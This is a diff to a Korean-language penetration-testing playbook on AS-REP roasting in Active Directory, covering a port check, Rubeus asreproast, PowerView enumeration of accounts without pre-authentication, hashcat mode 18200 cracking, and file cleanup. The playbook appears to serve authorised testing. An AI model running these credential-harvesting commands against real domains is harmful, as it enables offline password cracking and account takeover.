@@ -14,15 +14,11 @@ tags:
 
 Kerberos 사전 인증(pre-authentication)을 요구하지 않는 도메인 사용자를 알고 있다면 공격자 계정 없이 AS-REP hash를 요청하고, 대상 사용자의 비밀번호를 오프라인으로 복구할 수 있는지 확인한다.
 
-## 사용할 때
-
-- Kerberos KDC에 접근할 수 있고 도메인명과 사용자 후보를 알고 있을 때.
-- PowerView에서 `DONT_REQ_PREAUTH`가 설정된 계정을 확인했을 때.
-- Kerbrute 사용자 열거 중 `has no pre auth required`와 AS-REP hash가 함께 반환됐을 때.
-
 ## 전제 조건
 
 먼저 **명령을 실행할 위치에서 DC의 88번 포트에 접근할 수 있는지** 확인한다.
+
+`<DC_IP>`는 KDC의 IP, `<DOMAIN>`은 Kerberos realm에 대응하는 DNS 도메인, `<TARGET_USER>`와 `<USER_LIST>`는 사전 인증 제외 여부를 확인할 대상이다. `<ASREP_HASH_FILE>`·potfile·wordlist는 Linux 또는 Windows 분석 호스트의 경로이며 hash는 대상 사용자의 NT hash가 아니다.
 
 ```bash
 nc -vz <DC_IP> 88
@@ -78,6 +74,7 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 ```powershell
 Test-Path -LiteralPath '<ASREP_HASH_FILE>'
 .\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat /outfile:<ASREP_HASH_FILE>
+Test-Path -LiteralPath '<ASREP_HASH_FILE>'
 ```
 
 확인할 출력:
@@ -135,7 +132,7 @@ hashcat -m 18200 '<ASREP_HASH_FILE>' '<WORDLIST>' --potfile-path '<ASREP_POTFILE
 
 ## 변경 영향과 복구
 
-이 절차는 AD 객체의 `DONT_REQ_PREAUTH`를 변경하지 않지만 KDC 감사 기록과 공격·분석 호스트의 hash·potfile을 남긴다. 실행 전 없음을 확인한 작업 경로만 사용하고, 필요한 결과를 승인된 보관 위치로 인계한 뒤 이번 작업에서 생성한 exact 파일만 제거한다.
+이 절차는 AD 객체의 `DONT_REQ_PREAUTH`를 변경하지 않지만 KDC 감사 기록과 공격·분석 호스트의 hash·potfile을 남긴다. 실행 전 없음을 확인한 작업 경로만 사용하고, 사용 후 이번 작업에서 생성한 exact 파일만 제거한다.
 
 ```bash
 rm -f -- '<ASREP_HASH_FILE>' '<ASREP_POTFILE>'
